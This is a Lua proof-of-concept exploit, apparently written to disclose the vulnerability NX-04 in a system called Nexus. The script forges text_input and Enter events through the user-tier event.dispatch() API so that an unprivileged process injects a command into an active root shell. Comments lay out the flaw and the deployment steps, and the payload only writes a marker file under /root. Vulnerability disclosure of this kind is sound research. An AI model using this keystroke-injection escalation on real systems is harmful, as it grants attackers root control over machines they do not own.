-- NV-2026-001 / NX-04 proof of concept.
--
-- Demonstrates that an unprivileged userland process can inject keystrokes
-- into the active terminal. The user-tier `event` API exposes dispatch()
-- (and setForeground()/removeQueue()); env.lua only withholds addHook,
-- removeHook and markIdle. event.dispatch() runs every registered kernel
-- hook, and the tty driver registers its input hook with event.addHook().
-- tty.signal() ignores the keyboard address and feeds the event straight to
-- ttys[activeId], so a forged text_input + Enter lands in whatever program is
-- reading on the active terminal. When that program is a root shell, the
-- injected line runs as root.
--
-- Deploy to /usr/bin/ (main.lua makes it 0755). With a root shell reading on
-- the active console, run as an unprivileged user from a BACKGROUND process
-- that yields (so the root shell is the active reader), e.g. launched with a
-- trailing '&', or from a second cooperatively-scheduled process:
--     nx04_event_injection &
--
-- Local research only. Do not run against systems you do not own.

if not _NEXUS then
    io.stderr:write("nx04: run this inside Nexus\n")
    os.exit(1)
end

local event = require("event")
local process = require("process")

local function fail(message)
    io.stderr:write("nx04: " .. message .. "\n")
    os.exit(1)
end

local me = process.getCurrent()
if not me then fail("cannot identify the current process") end
if me.euid == 0 then fail("run this as an unprivileged user") end

-- The line the active (root) shell will run. Writes a marker only root can
-- create and records the effective uid of the shell that ran it.
local marker = "/root/nx04_proof"
local command = 'id -u > ' .. marker .. ' 2>/dev/null; ' ..
    'echo nx04 euid=$(id -u) >> ' .. marker

io.write("nx04: injecting a command into the active terminal\n")
io.write("nx04: waiting for a reader to be active, then dispatching keys\n")

-- Give the foreground shell a moment to block in its line read, then inject.
-- dispatch() -> tty input hook -> ttys[activeId]: the keyboard address in
-- slot 2 is ignored, so any value works.
for _ = 1, 20 do
    -- printable text arrives as text_input (slot 3 holds the whole string)
    event.dispatch(table.pack("text_input", "nx04", command))
    -- Enter: key_down with char 13 (key code 28), which commits the line
    event.dispatch(table.pack("key_down", "nx04", 13, 28))
    os.sleep(0.2)
    local f = io.open(marker, "r")
    if f then
        local line = f:readAll()
        f:close()
        io.write("nx04: " .. marker .. " created:\n" .. tostring(line))
        io.write("nx04: if it shows euid=0, NX-04 is confirmed\n")
        os.exit(0)
    end
end

io.write("nx04: no marker yet -- ensure a root shell is the active reader\n")
